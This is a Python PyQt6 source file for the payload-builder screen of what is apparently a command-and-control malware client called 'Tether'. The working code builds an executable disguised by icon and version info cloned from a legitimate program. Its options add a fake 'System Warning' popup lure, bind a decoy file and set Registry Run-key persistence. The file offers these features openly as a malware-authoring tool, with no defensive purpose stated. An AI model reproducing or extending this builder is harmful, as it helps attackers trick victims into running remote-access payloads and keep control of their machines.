# C2_Client/ui/builder_pane.py
import os
import uuid
import tempfile
import re
import traceback
import pefile
from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QLineEdit, QPushButton,
                             QTextEdit, QCheckBox, QComboBox, QSpinBox, QGroupBox,
                             QFileDialog, QLabel, QStackedWidget, QMessageBox, QFormLayout,
                             QScrollArea, QDateTimeEdit)
from PyQt6.QtCore import pyqtSignal, Qt, QDateTime

class BuilderPane(QWidget):
    build_requested = pyqtSignal(dict)

    def __init__(self, db_manager):
        super().__init__()
        self.db = db_manager
        self.bind_file_path = None
        self.active_icon_path = None

        self.stack = QStackedWidget()
        main_layout = QVBoxLayout(self); main_layout.setContentsMargins(0,0,0,0)
        main_layout.addWidget(self.stack)

        builder_scroll_area = QScrollArea()
        builder_scroll_area.setWidgetResizable(True)
        builder_scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        builder_widget = QWidget()
        builder_scroll_area.setWidget(builder_widget)

        layout = QVBoxLayout(builder_widget)
        layout.setContentsMargins(10,10,10,10); layout.setSpacing(10)
        
        layout.addWidget(QLabel("<h2>BUILDER</h2>"))

        main_payload_group = QGroupBox("Main Payload")
        main_payload_layout = QVBoxLayout(main_payload_group)
        name_ext_layout = QHBoxLayout()
        self.payload_name = QLineEdit("TetherPayload")
        self.payload_ext = QLineEdit(".exe")
        self.payload_ext.setFixedWidth(80)
        name_ext_layout.addWidget(self.payload_name, 3); name_ext_layout.addWidget(self.payload_ext, 1)
        main_payload_layout.addLayout(name_ext_layout)
        layout.addWidget(main_payload_group)
        
        cloning_group = QGroupBox("Payload Appearance & Spoofing")
        cloning_layout = QVBoxLayout(cloning_group)
        self.customize_details_checkbox = QCheckBox("Customize File Properties")
        self.customize_details_checkbox.stateChanged.connect(self.toggle_details_view)
        cloning_layout.addWidget(self.customize_details_checkbox)
        self.details_group = QGroupBox("Custom Properties"); self.details_group.setVisible(False)
        details_layout = QFormLayout(self.details_group)
        self.clone_target_button = QPushButton("Clone Icon & Properties From Executable (.exe)"); self.clone_target_button.clicked.connect(self.select_clone_target)
        self.target_label = QLabel("Source: None")
        details_layout.addRow(self.target_label); details_layout.addRow(self.clone_target_button)
        self.clone_file_description = QLineEdit(); details_layout.addRow("File Description:", self.clone_file_description)
        self.clone_company_name = QLineEdit(); details_layout.addRow("Company Name:", self.clone_company_name)
        self.clone_product_name = QLineEdit(); details_layout.addRow("Product Name:", self.clone_product_name)
        self.clone_original_filename = QLineEdit(); details_layout.addRow("Original Filename:", self.clone_original_filename)
        self.clone_legal_copyright = QLineEdit(); details_layout.addRow("Legal Copyright:", self.clone_legal_copyright)
        self.clone_file_version = QLineEdit(); details_layout.addRow("File Version (e.g., 1.2.3.4):", self.clone_file_version)
        cloning_layout.addWidget(self.details_group)
        layout.addWidget(cloning_group)

        deception_group = QGroupBox("Deception & Lures")
        deception_layout = QVBoxLayout(deception_group)
        self.custom_popup_checkbox = QCheckBox("Show Custom Popup on First Execution")
        deception_layout.addWidget(self.custom_popup_checkbox)
        self.custom_popup_group = QGroupBox("Popup Message")
        self.custom_popup_group.setVisible(False)
        popup_layout = QFormLayout(self.custom_popup_group)
        self.popup_title_input = QLineEdit("System Warning")
        self.popup_message_input = QTextEdit("A critical system component has failed to load.")
        self.popup_message_input.setMaximumHeight(80)
        popup_layout.addRow("Title:", self.popup_title_input)
        popup_layout.addRow("Message:", self.popup_message_input)
        deception_layout.addWidget(self.custom_popup_group)
        self.custom_popup_checkbox.stateChanged.connect(self.custom_popup_group.setVisible)

        bind_layout = QHBoxLayout()
        self.bind_file_button = QPushButton("Bind Decoy File")
        self.bind_file_button.clicked.connect(self.select_bind_file)
        self.bind_label = QLabel("None")
        bind_layout.addWidget(self.bind_file_button)
        bind_layout.addWidget(self.bind_label, 1)
        deception_layout.addLayout(bind_layout)
        layout.addWidget(deception_group)
        
        persist_group = QGroupBox("Resilience")
        persist_layout = QVBoxLayout(persist_group)
        self.startup_persist = QCheckBox("Startup Persistence (Adds to Registry Run key)")
        persist_layout.addWidget(self.startup_persist)
        layout.addWidget(persist_group)

        layout.addStretch()

        self.build_button = QPushButton("Build Payload")
        self.build_button.clicked.connect(self.on_build)
        layout.addWidget(self.build_button)
        
        self.build_log_pane = QWidget(); log_layout = QVBoxLayout(self.build_log_pane); self.build_log_output = QTextEdit(); self.build_log_output.setReadOnly(True); self.stop_build_button = QPushButton("Stop Build"); self.stop_build_button.setObjectName("StopBuildButton"); self.stop_build_button.setEnabled(False); self.back_to_builder_button = QPushButton("< Back to Builder"); self.back_to_builder_button.clicked.connect(self.show_builder_pane); self.back_to_builder_button.hide(); log_layout.addWidget(QLabel("<h3>BUILDING PAYLOAD...</h3>")); log_layout.addWidget(self.build_log_output, 1); log_layout.addWidget(self.stop_build_button); log_layout.addWidget(self.back_to_builder_button)
        
        self.stack.addWidget(builder_scroll_area)
        self.stack.addWidget(self.build_log_pane)

    def on_build(self):
        try:
            if not self.payload_name.text():
                QMessageBox.warning(self, "Warning", "Payload name cannot be empty.")
                return
            
            settings = {
                "payload_name": self.payload_name.text().strip(), 
                "payload_ext": self.payload_ext.text().strip() or ".exe",
                "cloning": { 
                    "enabled": self.customize_details_checkbox.isChecked(), 
                    "icon": self.active_icon_path, 
                    "version_info": { 
                        "FileDescription": self.clone_file_description.text(), 
                        "CompanyName": self.clone_company_name.text(), 
                        "ProductName": self.clone_product_name.text(), 
                        "OriginalFilename": self.clone_original_filename.text(), 
                        "LegalCopyright": self.clone_legal_copyright.text(), 
                        "FileVersion": self.clone_file_version.text(),
                    } 
                },
                "persistence": self.startup_persist.isChecked(),
                "popup_enabled": self.custom_popup_checkbox.isChecked(), 
                "popup_title": self.popup_title_input.text(), 
                "popup_message": self.popup_message_input.toPlainText(),
                "bind_path": self.bind_file_path, 
            }
            self.build_requested.emit(settings)
        except Exception as e:
            QMessageBox.critical(self, "Build Error", f"An unexpected error occurred during build preparation:\n{e}")

    def toggle_details_view(self, checked):
        self.details_group.setVisible(checked)

    def _extract_icon(self, pe, icon_path):
        try:
            rt_grp_icon_dir = pe.DIRECTORY_ENTRY_RESOURCE.entries[pefile.RESOURCE_TYPE['RT_GROUP_ICON']].directory
            icon_group_entry = rt_grp_icon_dir.entries[0]
            icon_data_entry = icon_group_entry.directory.entries[0].data
            grp_icon_data = pe.get_memory_mapped_image()[icon_data_entry.struct.OffsetToData:icon_data_entry.struct.OffsetToData + icon_data_entry.struct.Size]
            
            best_entry = grp_icon_data[6:20] # First entry is often highest resolution
            icon_id = int.from_bytes(best_entry[12:14], 'little')

            rt_icon_dir = pe.DIRECTORY_ENTRY_RESOURCE.entries[pefile.RESOURCE_TYPE['RT_ICON']].directory
            icon_res_entry = next(e for e in rt_icon_dir.entries if e.id == icon_id)
            icon_data_rva = icon_res_entry.directory.entries[0].data.struct.OffsetToData
            icon_size = icon_res_entry.directory.entries[0].data.struct.Size
            icon_data = pe.get_memory_mapped_image()[icon_data_rva:icon_data_rva + icon_size]
            
            ico_header = b'\x00\x00\x01\x00\x01\x00' # Standard ICO header for one image
            ico_dir_entry = best_entry[:8] + icon_size.to_bytes(4, 'little') + (22).to_bytes(4, 'little')
            
            with open(icon_path, 'wb') as f:
                f.write(ico_header); f.write(ico_dir_entry); f.write(icon_data)
        except Exception as e:
            raise Exception(f"Failed during icon extraction: {e}\n\nThis can happen with unusual executables. Try another file.")

    def _clone_properties_from_path(self, path):
        try:
            pe = pefile.PE(path, fast_load=True)
            pe.parse_data_directories(directories=[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_RESOURCE']])
            
            icon_path = os.path.join(tempfile.gettempdir(), f"tether_{uuid.uuid4().hex}.ico")
            self._extract_icon(pe, icon_path)
            
            version_info = {}
            if hasattr(pe, 'VS_VERSIONINFO') and pe.VS_VERSIONINFO:
                if hasattr(pe.VS_VERSIONINFO[0], 'StringFileInfo') and pe.VS_VERSIONINFO[0].StringFileInfo:
                    lang_entry = pe.VS_VERSIONINFO[0].StringFileInfo[0].entries
                    version_info = { k.decode(): v.decode() for k, v in lang_entry.items() }

            self.active_icon_path = icon_path
            self.target_label.setText(f"Cloned: {os.path.basename(path)}")
            self.clone_file_description.setText(version_info.get("FileDescription", ""))
            self.clone_company_name.setText(version_info.get("CompanyName", ""))
            self.clone_product_name.setText(version_info.get("ProductName", ""))
            self.clone_original_filename.setText(version_info.get("OriginalFilename", ""))
            self.clone_legal_copyright.setText(version_info.get("LegalCopyright", ""))
            self.clone_file_version.setText(version_info.get("FileVersion", ""))

        except Exception as e:
            QMessageBox.critical(self, "Error Cloning Properties", f"Could not extract properties from the selected file:\n\n{e}")
            self.active_icon_path = None
            self.target_label.setText("Source: None")

    def select_clone_target(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select Target Executable", "", "Executables (*.exe)")
        if path:
            self._clone_properties_from_path(path)

    def select_bind_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select File to Bind")
        if path:
            self.bind_file_path = path
            self.bind_label.setText(os.path.basename(path))

    def show_build_log_pane(self):
        self.build_log_output.clear()
        self.back_to_builder_button.hide()
        self.stop_build_button.setEnabled(True)
        self.stack.setCurrentIndex(1)

    def show_builder_pane(self):
        self.stack.setCurrentIndex(0)